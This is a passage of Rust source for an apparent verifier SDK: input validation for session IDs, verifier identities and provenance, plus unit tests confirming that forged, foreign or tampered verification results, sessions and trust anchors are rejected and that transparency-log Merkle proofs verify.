    if !remainder
        .bytes()
        .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'-' | b'_'))
    {
        return Err(VerifierSdkError::InvalidVerifierIdentity {
            actual: verifier_identity.to_string(),
            reason: "identity must include only ASCII letters, digits, '.', '-', and '_'"
                .to_string(),
        });
    }
    Ok(())
}

fn validate_session_id(session_id: &str) -> Result<(), VerifierSdkError> {
    if session_id.trim().is_empty() {
        return Err(VerifierSdkError::InvalidSessionId {
            actual: session_id.to_string(),
            reason: "session id must be non-empty".to_string(),
        });
    }
    if session_id != session_id.trim() {
        return Err(VerifierSdkError::InvalidSessionId {
            actual: session_id.to_string(),
            reason: "session id must not contain leading or trailing whitespace".to_string(),
        });
    }
    if session_id.len() > MAX_SESSION_ID_LEN {
        return Err(VerifierSdkError::InvalidSessionId {
            actual: session_id.to_string(),
            reason: format!("session id must be at most {MAX_SESSION_ID_LEN} ASCII bytes"),
        });
    }
    if !session_id
        .bytes()
        .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'-' | b'_'))
    {
        return Err(VerifierSdkError::InvalidSessionId {
            actual: session_id.to_string(),
            reason: "session id must include only ASCII letters, digits, '.', '-', and '_'"
                .to_string(),
        });
    }
    Ok(())
}

fn validate_session_provenance(session: &VerificationSession) -> Result<(), VerifierSdkError> {
    validate_session_id(&session.session_id)?;
    validate_verifier_identity(&session.verifier_identity)?;
    if session.session_id != session.origin_session_id {
        return Err(VerifierSdkError::SessionProvenanceMismatch {
            field: "session_id",
            expected: session.origin_session_id.clone(),
            actual: session.session_id.clone(),
        });
    }
    if session.verifier_identity != session.origin_verifier_identity {
        return Err(VerifierSdkError::SessionProvenanceMismatch {
            field: "verifier_identity",
            expected: session.origin_verifier_identity.clone(),
            actual: session.verifier_identity.clone(),
        });
    }
    if session.created_at != session.origin_created_at {
        return Err(VerifierSdkError::SessionProvenanceMismatch {
            field: "created_at",
            expected: session.origin_created_at.clone(),
            actual: session.created_at.clone(),
        });
    }
    if session.session_nonce != session.origin_session_nonce {
        return Err(VerifierSdkError::SessionProvenanceMismatch {
            field: "session_nonce",
            expected: session.origin_session_nonce.clone(),
            actual: session.session_nonce.clone(),
        });
    }
    Ok(())
}

fn is_canonical_sha256_hex(value: &str) -> bool {
    value.len() == 64
        && value
            .bytes()
            .all(|byte| matches!(byte, b'0'..=b'9' | b'a'..=b'f'))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    use std::collections::BTreeMap;

    fn make_replay_bundle_bytes(verifier_identity: &str) -> Vec<u8> {
        let artifact_bytes = b"replay-bundle-artifact";
        let artifact_path = "artifacts/replay.json".to_string();
        let mut artifacts = BTreeMap::new();
        artifacts.insert(
            artifact_path.clone(),
            bundle::BundleArtifact {
                media_type: "application/json".to_string(),
                digest: bundle::hash(artifact_bytes),
                bytes_hex: hex::encode(artifact_bytes),
            },
        );
        let mut replay_bundle = bundle::ReplayBundle {
            header: bundle::BundleHeader {
                hash_algorithm: bundle::REPLAY_BUNDLE_HASH_ALGORITHM.to_string(),
                payload_length_bytes: u64::try_from(artifact_bytes.len())
                    .expect("artifact length should fit in u64"),
                chunk_count: 1,
            },
            schema_version: bundle::REPLAY_BUNDLE_SCHEMA_VERSION.to_string(),
            sdk_version: SDK_VERSION.to_string(),
            bundle_id: "bundle-alpha".to_string(),
            incident_id: "incident-alpha".to_string(),
            created_at: "2026-02-21T00:00:00Z".to_string(),
            policy_version: "policy.v1".to_string(),
            verifier_identity: verifier_identity.to_string(),
            timeline: vec![bundle::TimelineEvent {
                sequence_number: 1,
                event_id: "evt-1".to_string(),
                timestamp: "2026-02-21T00:00:01Z".to_string(),
                event_type: "verification.started".to_string(),
                payload: json!({"phase": "replay"}),
                state_snapshot: json!({"step": 1}),
                causal_parent: None,
                policy_version: "policy.v1".to_string(),
            }],
            initial_state_snapshot: json!({"baseline": true}),
            evidence_refs: vec!["evidence://capsule/alpha".to_string()],
            artifacts,
            chunks: vec![bundle::BundleChunk {
                chunk_index: 0,
                total_chunks: 1,
                artifact_path,
                payload_length_bytes: u64::try_from(artifact_bytes.len())
                    .expect("artifact length should fit in u64"),
                payload_digest: bundle::hash(artifact_bytes),
            }],
            metadata: BTreeMap::new(),
            integrity_hash: String::new(),
            signature: bundle::BundleSignature {
                algorithm: bundle::REPLAY_BUNDLE_HASH_ALGORITHM.to_string(),
                signature_hex: String::new(),
            },
        };
        bundle::seal(&mut replay_bundle).expect("test replay bundle should seal");
        bundle::serialize(&replay_bundle).expect("test replay bundle should serialize")
    }

    #[test]
    fn test_sdk_version_constant() {
        assert_eq!(SDK_VERSION, "vsdk-v1.0");
    }

    #[test]
    fn test_sdk_version_min_constant() {
        assert_eq!(SDK_VERSION_MIN, "vsdk-v1.0");
    }

    #[test]
    fn session_step_accepts_signed_result_from_same_verifier() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("same verifier session should be created");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should be built");

        let step = sdk
            .record_session_step(&mut session, &result)
            .expect("same verifier result should record");

        assert_eq!(step.step_index, 0);
        assert_eq!(step.verdict, VerificationVerdict::Pass);
        assert_eq!(session.steps().len(), 1);
        assert_eq!(
            session.steps()[0].artifact_binding_hash,
            "artifact-hash-alpha"
        );
        assert!(!session.steps()[0].step_signature.is_empty());
    }

    #[test]
    fn session_step_rejects_result_from_different_verifier() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let other_sdk = create_verifier_sdk("verifier://beta");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("same verifier session should be created");
        let foreign_result = other_sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "foreign verifier".to_string(),
                }],
                "artifact-hash-beta".to_string(),
            )
            .expect("foreign verifier result should be built");

        let err = sdk
            .record_session_step(&mut session, &foreign_result)
            .expect_err("foreign verifier result must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::ResultOriginMismatch { .. }
        ));
        assert!(session.steps().is_empty());
    }

    #[test]
    fn record_session_step_rejects_forged_same_verifier_result() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("same verifier session should be created");
        let mut forged_result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should be built");
        forged_result.verdict = VerificationVerdict::Fail;
        forged_result.checked_assertions[0].detail = "forged locally".to_string();
        forged_result.result_origin_nonce.clear();
        forged_result.verifier_signature =
            facade_result_signature(&forged_result).expect("forged signature should compute");

        let err = sdk
            .record_session_step(&mut session, &forged_result)
            .expect_err("forged same-verifier result must be rejected");

        assert!(matches!(err, VerifierSdkError::ResultOriginMismatch { .. }));
        assert!(session.steps().is_empty());
    }

    #[test]
    fn record_session_step_rejects_same_verifier_result_from_different_sdk_instance() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let sibling_sdk = create_verifier_sdk("verifier://alpha");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("same verifier session should be created");
        let sibling_result = sibling_sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier sibling instance".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier sibling result should be built");

        let err = sdk
            .record_session_step(&mut session, &sibling_result)
            .expect_err("same-verifier result from a different sdk instance must be rejected");

        assert!(matches!(err, VerifierSdkError::ResultOriginMismatch { .. }));
        assert!(session.steps().is_empty());
    }

    #[test]
    fn transparency_log_accepts_signed_result_from_same_verifier() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should be built");
        let mut log = Vec::new();

        let entry = sdk
            .append_transparency_log(&mut log, &result)
            .expect("same verifier result should append");

        assert_eq!(entry.verifier_id, "verifier://alpha");
        assert_eq!(entry.merkle_proof[0], format!("root:{}", entry.result_hash));
        assert_eq!(entry.merkle_proof[1], "leaf_index:0");
        assert_eq!(entry.merkle_proof[2], "tree_size:1");
        assert_eq!(log.len(), 1);
        assert_eq!(log[0], entry);
    }

    #[test]
    fn transparency_log_emits_verifiable_merkle_audit_path() {
        fn proof_root(proof: &[String]) -> &str {
            proof[0]
                .strip_prefix("root:")
                .expect("proof must begin with encoded root")
        }

        fn verify_merkle_proof(leaf_hash: &str, proof: &[String]) -> String {
            let leaf_index = proof[1]
                .strip_prefix("leaf_index:")
                .expect("proof must encode leaf index")
                .parse::<usize>()
                .expect("leaf index should parse");
            let tree_size = proof[2]
                .strip_prefix("tree_size:")
                .expect("proof must encode tree size")
                .parse::<usize>()
                .expect("tree size should parse");

            assert!(leaf_index < tree_size);

            let mut computed = leaf_hash.to_string();
            for step in &proof[3..] {
                if let Some(left) = step.strip_prefix("left:") {
                    computed = transparency_merkle_parent_hash(left, &computed);
                } else if let Some(right) = step.strip_prefix("right:") {
                    computed = transparency_merkle_parent_hash(&computed, right);
                } else {
                    panic!("unexpected proof step: {step}");
                }
            }
            computed
        }

        let sdk = create_verifier_sdk("verifier://alpha");
        let first = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "first".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("first result should build");
        let second = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "second".to_string(),
                }],
                "artifact-hash-beta".to_string(),
            )
            .expect("second result should build");

        let mut log = Vec::new();
        let first_entry = sdk
            .append_transparency_log(&mut log, &first)
            .expect("first result should append");
        let second_entry = sdk
            .append_transparency_log(&mut log, &second)
            .expect("second result should append");

        assert_eq!(
            verify_merkle_proof(&first_entry.result_hash, &first_entry.merkle_proof),
            proof_root(&first_entry.merkle_proof)
        );
        assert_eq!(
            verify_merkle_proof(&second_entry.result_hash, &second_entry.merkle_proof),
            proof_root(&second_entry.merkle_proof)
        );
        assert_eq!(second_entry.merkle_proof[1], "leaf_index:1");
        assert_eq!(second_entry.merkle_proof[2], "tree_size:2");
        assert_eq!(
            second_entry.merkle_proof[3],
            format!("left:{}", first_entry.result_hash)
        );
    }

    #[test]
    fn seal_session_accepts_same_verifier_session() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("same verifier session should be created");

        let verdict = sdk
            .seal_session(&mut session)
            .expect("same verifier session should seal");

        assert_eq!(verdict, VerificationVerdict::Inconclusive);
        assert!(session.sealed);
        assert_eq!(
            session.final_verdict,
            Some(VerificationVerdict::Inconclusive)
        );
    }

    #[test]
    fn seal_session_rejects_foreign_verifier_session() {
        let foreign_sdk = create_verifier_sdk("verifier://beta");
        let mut foreign_session = foreign_sdk
            .create_session("session-beta")
            .expect("foreign verifier session should be created");
        let sdk = create_verifier_sdk("verifier://alpha");

        let err = sdk
            .seal_session(&mut foreign_session)
            .expect_err("foreign verifier session must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::SessionVerifierMismatch { .. }
        ));
        assert!(!foreign_session.sealed);
        assert!(foreign_session.final_verdict.is_none());
    }

    #[test]
    fn record_session_step_rejects_relabeled_foreign_session() {
        let foreign_sdk = create_verifier_sdk("verifier://beta");
        let mut foreign_session = foreign_sdk
            .create_session("session-beta")
            .expect("foreign verifier session should be created");
        foreign_session.verifier_identity = "verifier://alpha".to_string();
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same-verifier result should build");

        let err = sdk
            .record_session_step(&mut foreign_session, &result)
            .expect_err("relabeled foreign session must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::SessionProvenanceMismatch {
                field: "verifier_identity",
                ..
            }
        ));
        assert!(foreign_session.steps().is_empty());
    }

    #[test]
    fn seal_session_rejects_relabeled_foreign_session() {
        let foreign_sdk = create_verifier_sdk("verifier://beta");
        let mut foreign_session = foreign_sdk
            .create_session("session-beta")
            .expect("foreign verifier session should be created");
        foreign_session.verifier_identity = "verifier://alpha".to_string();
        let sdk = create_verifier_sdk("verifier://alpha");

        let err = sdk
            .seal_session(&mut foreign_session)
            .expect_err("relabeled foreign session must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::SessionProvenanceMismatch {
                field: "verifier_identity",
                ..
            }
        ));
        assert!(!foreign_session.sealed);
        assert!(foreign_session.final_verdict.is_none());
    }

    #[test]
    fn seal_session_rejects_tampered_or_forged_steps() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("result should build");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("same verifier session should be created");
        sdk.record_session_step(&mut session, &result)
            .expect("valid recorded step should succeed");
        session.steps.push(SessionStep {
            step_index: 1,
            operation: VerificationOperation::Claim,
            verdict: VerificationVerdict::Pass,
            artifact_binding_hash: "artifact-hash-forged".to_string(),
            timestamp: current_utc_timestamp(),
            step_signature: "forged-step-signature".to_string(),
        });

        let err = sdk
            .seal_session(&mut session)
            .expect_err("forged step must be rejected during seal");

        assert!(matches!(
            err,
            VerifierSdkError::SessionStepSignatureMismatch { step_index: 1, .. }
        ));
        assert!(!session.sealed);
        assert!(session.final_verdict.is_none());
    }

    #[test]
    fn transparency_log_rejects_result_from_different_verifier() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let other_sdk = create_verifier_sdk("verifier://beta");
        let foreign_result = other_sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "foreign verifier".to_string(),
                }],
                "artifact-hash-beta".to_string(),
            )
            .expect("foreign verifier result should be built");
        let mut log = Vec::new();

        let err = sdk
            .append_transparency_log(&mut log, &foreign_result)
            .expect_err("foreign verifier result must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::ResultOriginMismatch { .. }
        ));
        assert!(log.is_empty());
    }

    #[test]
    fn facade_emits_runtime_rfc3339_timestamps() {
        const LEGACY_PLACEHOLDER_TIMESTAMP: &str = "2026-02-21T00:00:00Z";

        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should build");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("session should build with live timestamp");
        let step = sdk
            .record_session_step(&mut session, &result)
            .expect("step should record with live timestamp");
        let mut log = Vec::new();
        let entry = sdk
            .append_transparency_log(&mut log, &result)
            .expect("entry should append with live timestamp");

        for timestamp in [
            result.execution_timestamp.as_str(),
            session.created_at.as_str(),
            step.timestamp.as_str(),
            entry.timestamp.as_str(),
        ] {
            assert_ne!(timestamp, LEGACY_PLACEHOLDER_TIMESTAMP);
            chrono::DateTime::parse_from_rfc3339(timestamp)
                .expect("facade timestamps should be RFC3339");
        }
    }

    #[test]
    fn serialized_verification_result_omits_private_origin_nonce() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should be built");
        let serialized =
            serde_json::to_string(&result).expect("verification result serialization should work");
        let value: serde_json::Value =
            serde_json::from_str(&serialized).expect("serialized result should remain valid JSON");

        assert!(value.get("result_origin_nonce").is_none());
    }

    #[test]
    fn serialized_verification_result_round_trips_without_private_origin_nonce() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should be built");
        let serialized =
            serde_json::to_value(&result).expect("verification result serialization should work");
        let roundtrip: VerificationResult = serde_json::from_value(serialized)
            .expect("public JSON verification result should deserialize");

        assert_eq!(roundtrip.operation, VerificationOperation::Claim);
        assert_eq!(roundtrip.verdict, VerificationVerdict::Pass);
        assert_eq!(roundtrip.verifier_identity, "verifier://alpha");
        assert!(roundtrip.result_origin_nonce.is_empty());
    }

    #[test]
    fn confidence_score_reflects_partial_failed_assertions() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Fail,
                vec![
                    AssertionResult {
                        assertion: "capsule_replay_verified".to_string(),
                        passed: true,
                        detail: "replay matched".to_string(),
                    },
                    AssertionResult {
                        assertion: "capsule_output_hash_matches".to_string(),
                        passed: false,
                        detail: "hash diverged".to_string(),
                    },
                ],
                "artifact-hash-alpha".to_string(),
            )
            .expect("failed result should build");

        assert_eq!(result.confidence_score, 0.25);
    }

    #[test]
    fn confidence_score_preserves_midrange_inconclusive_signal() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Workflow,
                VerificationVerdict::Inconclusive,
                vec![
                    AssertionResult {
                        assertion: "workflow_preconditions_met".to_string(),
                        passed: true,
                        detail: "preconditions satisfied".to_string(),
                    },
                    AssertionResult {
                        assertion: "workflow_attestation_verified".to_string(),
                        passed: false,
                        detail: "attestation unavailable".to_string(),
                    },
                ],
                "artifact-hash-alpha".to_string(),
            )
            .expect("inconclusive result should build");

        assert_eq!(result.confidence_score, 0.5);
    }

    #[test]
    fn transparency_log_rejects_same_verifier_result_from_different_sdk_instance() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let sibling_sdk = create_verifier_sdk("verifier://alpha");
        let sibling_result = sibling_sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier sibling instance".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier sibling result should be built");
        let mut log = Vec::new();

        let err = sdk
            .append_transparency_log(&mut log, &sibling_result)
            .expect_err("same-verifier result from a different sdk instance must be rejected");

        assert!(matches!(err, VerifierSdkError::ResultOriginMismatch { .. }));
        assert!(log.is_empty());
    }

    #[test]
    fn transparency_log_leaf_hash_commits_authenticated_result_origin() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should be built");
        let public_json =
            serde_json::to_string(&result).expect("verification result should serialize");
        let original_hash =
            transparency_log_leaf_hash(&result).expect("original leaf hash should compute");
        result.result_origin_nonce = "alternate-origin-nonce".to_string();
        let tampered_hash =
            transparency_log_leaf_hash(&result).expect("tampered leaf hash should compute");

        assert_eq!(
            serde_json::to_string(&result).expect("tampered result should serialize"),
            public_json
        );
        assert_ne!(original_hash, tampered_hash);
    }

    #[test]
    fn verify_migration_artifact_rejects_structural_same_verifier_bundle() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let artifact = make_replay_bundle_bytes("verifier://alpha");

        let err = sdk
            .verify_migration_artifact(&artifact)
            .expect_err("structural same-verifier bundle must fail closed");

        assert!(matches!(
            err,
            VerifierSdkError::UnauthenticatedStructuralBundle { .. }
        ));
    }

    #[test]
    fn verify_migration_artifact_rejects_foreign_verifier_bundle() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let foreign_artifact = make_replay_bundle_bytes("verifier://beta");

        let err = sdk
            .verify_migration_artifact(&foreign_artifact)
            .expect_err("foreign-verifier bundle must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::SessionVerifierMismatch { .. }
        ));
    }

    #[test]
    fn verify_trust_state_rejects_structural_same_verifier_bundle() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let state = make_replay_bundle_bytes("verifier://alpha");
        let verified = bundle::verify(&state).expect("test bundle should verify");

        let err = sdk
            .verify_trust_state(&state, &verified.integrity_hash)
            .expect_err("structural same-verifier trust-state bundle must fail closed");

        assert!(matches!(
            err,
            VerifierSdkError::UnauthenticatedStructuralBundle { .. }
        ));
    }

    #[test]
    fn verify_trust_state_rejects_foreign_verifier_bundle() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let foreign_state = make_replay_bundle_bytes("verifier://beta");
        let verified = bundle::verify(&foreign_state).expect("test bundle should verify");

        let err = sdk
            .verify_trust_state(&foreign_state, &verified.integrity_hash)
            .expect_err("foreign-verifier trust-state bundle must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::SessionVerifierMismatch { .. }
        ));
    }

    #[test]
    fn verify_trust_state_rejects_uppercase_anchor_hash() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let state = make_replay_bundle_bytes("verifier://alpha");
        let verified = bundle::verify(&state).expect("test bundle should verify");

        let err = sdk
            .verify_trust_state(&state, &verified.integrity_hash.to_uppercase())
            .expect_err("uppercase trust anchor hash must be rejected");

        assert_eq!(
            err,
            VerifierSdkError::MalformedTrustAnchor {
                actual: verified.integrity_hash.to_uppercase(),
            }
        );
    }

    #[test]
    fn verify_trust_state_rejects_whitespace_padded_anchor_hash() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let state = make_replay_bundle_bytes("verifier://alpha");
        let verified = bundle::verify(&state).expect("test bundle should verify");
        let padded_hash = format!(" {} ", verified.integrity_hash);

        let err = sdk
            .verify_trust_state(&state, &padded_hash)
            .expect_err("whitespace-padded trust anchor hash must be rejected");

        assert_eq!(
            err,
            VerifierSdkError::MalformedTrustAnchor {
                actual: padded_hash,
            }
        );
    }

    #[test]
    fn verify_trust_state_rejects_mismatched_anchor_before_structural_guardrail() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let state = make_replay_bundle_bytes("verifier://alpha");
        let verified = bundle::verify(&state).expect("test bundle should verify");
        let wrong_anchor = "0".repeat(64);

        let err = sdk
            .verify_trust_state(&state, &wrong_anchor)
            .expect_err("mismatched trust anchor must fail before structural bundle handling");

        assert_eq!(
            err,
            VerifierSdkError::TrustAnchorMismatch {
                expected: wrong_anchor,
                actual: verified.integrity_hash,
            }
        );
    }

    #[test]
    fn validate_bundle_accepts_same_verifier_bundle() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let bundle = make_replay_bundle_bytes("verifier://alpha");

        sdk.validate_bundle(&bundle)
            .expect("same-verifier bundle should validate");
    }

    #[test]
    fn validate_bundle_rejects_foreign_verifier_bundle() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let foreign_bundle = make_replay_bundle_bytes("verifier://beta");

        let err = sdk
            .validate_bundle(&foreign_bundle)
            .expect_err("foreign-verifier bundle must be rejected during validation");

        assert!(matches!(
            err,
            VerifierSdkError::SessionVerifierMismatch { .. }
        ));
    }

    #[test]
    fn verify_claim_rejects_whitespace_only_verifier_identity() {
        let sdk = create_verifier_sdk("   ");
        let capsule = capsule::build_reference_capsule();

        let err = sdk
            .verify_claim(&capsule)
            .expect_err("whitespace-only verifier identity must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::InvalidVerifierIdentity { .. }
        ));
    }

    #[test]
    fn validate_bundle_rejects_control_character_verifier_identity() {
        let sdk = create_verifier_sdk("verifier://alpha\u{0000}");
        let bundle = make_replay_bundle_bytes("verifier://alpha");

        let err = sdk
            .validate_bundle(&bundle)
            .expect_err("control-character verifier identity must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::InvalidVerifierIdentity { .. }
        ));
    }

    #[test]
    fn create_session_rejects_excessively_long_verifier_identity() {
        let sdk = create_verifier_sdk(format!(
            "verifier://{}",
            "a".repeat(MAX_VERIFIER_IDENTITY_NAME_LEN + 1)
        ));

        let err = sdk
            .create_session("session-too-long")
            .expect_err("excessively long verifier identity must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::InvalidVerifierIdentity { .. }
        ));
    }

    #[test]
    fn create_session_rejects_empty_session_id() {
        let sdk = create_verifier_sdk("verifier://alpha");

        let err = sdk
            .create_session("")
            .expect_err("empty session id must be rejected");

        assert!(matches!(err, VerifierSdkError::InvalidSessionId { .. }));
    }

    #[test]
    fn create_session_rejects_whitespace_padded_session_id() {
        let sdk = create_verifier_sdk("verifier://alpha");

        let err = sdk
            .create_session(" session-alpha ")
            .expect_err("whitespace-padded session id must be rejected");

        assert!(matches!(err, VerifierSdkError::InvalidSessionId { .. }));
    }

    #[test]
    fn execute_workflow_rejects_unsupported_sdk_before_bundle_guardrails() {
        let mut sdk = create_verifier_sdk("verifier://alpha");
        sdk.sdk_version = "vsdk-v0".to_string();
        let bundle = make_replay_bundle_bytes("verifier://alpha");

        let err = sdk
            .execute_workflow(ValidationWorkflow::ReleaseValidation, &bundle)
            .expect_err("unsupported sdk version must be rejected before workflow bundle checks");

        assert_eq!(
            err,
            VerifierSdkError::UnsupportedSdk(format!(
                "{}: requested=vsdk-v0, supported={}",
                ERR_SDK_VERSION_UNSUPPORTED, SDK_VERSION
            ))
        );
    }

    #[test]
    fn create_session_rejects_control_character_session_id() {
        let sdk = create_verifier_sdk("verifier://alpha");

        let err = sdk
            .create_session("session-\u{0000}-alpha")
            .expect_err("control-character session id must be rejected");

        assert!(matches!(err, VerifierSdkError::InvalidSessionId { .. }));
    }

    #[test]
    fn record_session_step_rejects_mutated_invalid_session_id() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("valid session should be created");
        session.session_id = "session-\nalpha".to_string();
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("result should build");

        let err = sdk
            .record_session_step(&mut session, &result)
            .expect_err("mutated invalid session id must be rejected");

        assert!(matches!(err, VerifierSdkError::InvalidSessionId { .. }));
    }

    #[test]
    fn record_session_step_rejects_tampered_session_nonce() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("valid session should be created");
        session.session_nonce = "forged-session-nonce".to_string();
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("result should build");

        let err = sdk
            .record_session_step(&mut session, &result)
            .expect_err("tampered session nonce must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::SessionProvenanceMismatch {
                field: "session_nonce",
                ..
            }
        ));
        assert!(session.steps().is_empty());
    }

    #[test]
    fn seal_session_rejects_tampered_session_nonce() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("valid session should be created");
        session.session_nonce = "forged-session-nonce".to_string();

        let err = sdk
            .seal_session(&mut session)
            .expect_err("tampered session nonce must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::SessionProvenanceMismatch {
                field: "session_nonce",
                ..
            }
        ));
        assert!(!session.sealed);
        assert!(session.final_verdict.is_none());
    }

    #[test]
    fn test_structural_only_posture_markers_defined() {
        assert_eq!(
            STRUCTURAL_ONLY_SECURITY_POSTURE,
            "structural_only_not_replacement_critical"
        );
        assert_eq!(
            STRUCTURAL_ONLY_RULE_ID,
            "VERIFIER_SHORTCUT_GUARD::WORKSPACE_VERIFIER_SDK"
        );
    }

    #[test]
    fn test_check_sdk_version_supported() {
        assert!(check_sdk_version("vsdk-v1.0").is_ok());
    }

    #[test]
    fn test_check_sdk_version_unsupported() {
        let err = check_sdk_version("vsdk-v99.0");
        assert!(err.is_err());
        assert!(err.unwrap_err().contains(ERR_SDK_VERSION_UNSUPPORTED));
    }

    #[test]
    fn test_event_codes_defined() {
        assert_eq!(CAPSULE_CREATED, "CAPSULE_CREATED");
        assert_eq!(CAPSULE_SIGNED, "CAPSULE_SIGNED");
